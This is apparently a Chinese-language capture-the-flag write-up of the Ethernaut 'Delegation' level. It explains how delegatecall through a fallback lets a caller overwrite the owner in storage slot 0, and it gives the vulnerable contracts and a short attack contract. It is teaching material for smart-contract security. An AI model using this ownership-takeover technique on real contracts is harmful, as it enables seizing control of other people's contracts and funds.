# 6. Delegate

### 原题
```
这一关的目标是申明你对你创建实例的所有权.
```
```solidity
  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
### 分析
窃取所有权的又来咯。\
这个题目有点意思，这个里面的逻辑有点UUPS等代理架构的味道。\
我们来分析下。\
Delegate合约的公开方法pwn可以修改owner，\
如果是直接调用Delegate.pwn()，修改的是Delegate的owner。\
但是要求我们修改Delegation的所有权，我们看可以利用的只有fallback()。\
fallback的作用，什么时候触发，我假设大家都知道了。\
我在调用Delegation上不存在的函数的时候，就可以直接执行fallback了。\
再来看看里面的逻辑，执行了委托代理delegatecall，执行权交到了Delegate合约。\
那就意味着我可以通过代理去调用Delegate的pwn方法了。\
但是怎么来修改Delegation的owner呢？\
delegatecall有个很大的特性，虽然调用了目标合约的方法，\
但是方法里修改的状态变量都会在委托方的存储槽去查找（不是按照变量名称去查找，而是依照存储槽的编号，EVM里只认编号）。\
也就是说，\
只要代理合约和目标合约定义的状态变量顺序一致，\
那么委托执行的方法里面修改的状态变量都是修改的代理合约上的同样编号的存储槽。\
我们可以看到两个合约上的owner的定义都在第一个，也就是都是slot0的存储槽。\
这样委托执行的pwn方法，其实修改的是Delegation的owner。\
这个有点绕吧，但是正是有这样的机制，\
才让我们可以使用UUPS或者透明代理架构，可以达到合约升级的目的。\
不绕了，我自己也快被绕进去：），还是看看攻击代码吧
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface  IDelegation {
    function pwn() external ;
    function owner() external returns (address);
}

contract DelegationAttack {
    IDelegation delegation;

    constructor( address _delegation) {
      delegation = IDelegation(_delegation);
    }

    function attack() public {
      // 这里就是逼迫对方执行fallback函数(存在的话)，
      // 利用委托代理机制，达到攻击目的
      // “pwn()”是通过msg.data传送
      delegation.pwn();
    }

    function getOwner() public returns (address) {
       return  delegation.owner();
    }
}
```